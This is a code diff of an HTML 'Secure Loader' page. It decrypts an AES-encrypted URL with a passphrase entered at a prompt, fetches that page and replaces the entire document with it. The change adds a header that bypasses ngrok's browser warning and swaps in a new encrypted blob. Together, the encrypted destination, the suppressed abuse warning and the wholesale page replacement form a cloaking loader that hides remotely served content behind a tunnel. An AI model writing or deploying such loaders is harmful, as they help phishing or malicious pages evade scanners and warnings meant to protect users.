@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Loader</title>
+<title>Secure Loader</title>
 </head>
 <body>
 <script>
@@ -17,8 +17,20 @@ async function loadPage(blobB64, pass, iterations){
 
     // PBKDF2 key derivation
     async function deriveKeyPBKDF2(pass, salt, iterations){
-        const base = await crypto.subtle.importKey('raw', new TextEncoder().encode(pass), 'PBKDF2', false, ['deriveKey']);
-        return crypto.subtle.deriveKey({name:'PBKDF2', salt, iterations, hash:'SHA-256'}, base, {name:'AES-GCM', length:256}, false, ['decrypt']);
+        const base = await crypto.subtle.importKey(
+            'raw',
+            new TextEncoder().encode(pass),
+            'PBKDF2',
+            false,
+            ['deriveKey']
+        );
+        return crypto.subtle.deriveKey(
+            {name:'PBKDF2', salt, iterations, hash:'SHA-256'},
+            base,
+            {name:'AES-GCM', length:256},
+            false,
+            ['decrypt']
+        );
     }
 
     // AES-GCM decryption
@@ -35,8 +47,10 @@ async function loadPage(blobB64, pass, iterations){
     // Decrypt to get the URL
     const url = await aesDecrypt(blobB64, pass, iterations);
 
-    // Fetch the page from that URL
-    const response = await fetch(url);
+    // Fetch the page with ngrok header to skip splash
+    const response = await fetch(url, {
+        headers: { "ngrok-skip-browser-warning": "1" }
+    });
     const html = await response.text();
 
     // Replace entire page
@@ -46,7 +60,7 @@ async function loadPage(blobB64, pass, iterations){
 }
 
 // Example usage
-const encryptedBlob = "f10OeWDStzAHQ/OHql9uZX5136xUgB2HT38DnL69XUGBDhJFXehnW0CJbAtKyAsWtfleJ0t1S6zg6P0FqdF7wz7TcpFqbCH+I37n5Bj3hZSiBN4IcliPB0dJ";
+const encryptedBlob = "gKqLqq39SscqmPiYto+T/xmQWwqYTZt24r+CmJoyUifTA0BSyvPl4dB0ActWgk18W1zO+MVou2jWtiazJ8M5YfNxHRwf4hAuqznfLWkBd4Q=";
 const passphrase = prompt("Enter AES passphrase:");
 loadPage(encryptedBlob, passphrase, 300000);
 </script>
